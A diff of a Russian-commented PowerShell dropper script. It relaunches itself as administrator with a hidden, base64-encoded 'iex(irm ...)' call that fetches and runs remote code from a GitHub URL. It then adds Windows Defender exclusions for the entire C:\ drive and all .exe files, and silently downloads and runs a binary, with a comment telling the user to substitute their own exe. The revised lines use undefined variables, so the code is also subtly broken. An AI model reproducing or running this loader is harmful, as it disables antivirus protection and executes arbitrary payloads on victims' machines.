@@ -1,28 +1,31 @@
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
 
-# 1. нормальный перезапуск от админа
+# 1. жесткий перезапуск от админа
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # используем encodedcommand или просто передаем скрипт-блок правильно
-    # добавил -WindowStyle Hidden чтобы не мелькало, если не хочешь видеть окно
-    $scriptPath = "https://raw.githubusercontent.com/sanek421/13232/main/bibriki"
-    start-process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& {iex(irm '$scriptPath')}`"" -Verb RunAs
+    $url = "https://raw.githubusercontent.com/sanek421/13232/main/bibriki"
+    # кодируем команду в base64, чтобы пробросить её без косяков с кавычками
+    $cmd = "iex(irm $url)"
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+    $encoded = [Convert]::ToBase64String($bytes)
+    
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" -Verb RunAs
     exit
 }
 
-# 2. исключения (теперь точно от админа)
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_SZ /d 0 /f > $null 2>&1
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f > $null 2>&1
+# 2. вносим исключения
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_SZ /d 0 /f > $null 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f > $null 2>&1
 
-# 3. качаем и запускаем
+# 3. качаем и запускаем твой бинарник
+# замени ссылку на прямую ссылку на свой exe
 $url = "https://download-installer.cdn.mozilla.net/pub/firefox/releases/148.0.2/win32/ru/Firefox%20Installer.exe"
 $out = "$env:TEMP\Firefox%20Installer.exe"
 
-# используем curl (iwr)
 try {
-    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
-    if (Test-Path $out) {
-        Start-Process -FilePath $out -WindowStyle Hidden
+    Invoke-WebRequest -Uri $exeUrl -OutFile $path -UseBasicParsing
+    if (Test-Path $path) {
+        Start-Process -FilePath $path -WindowStyle Hidden
     }
 } catch {
     exit
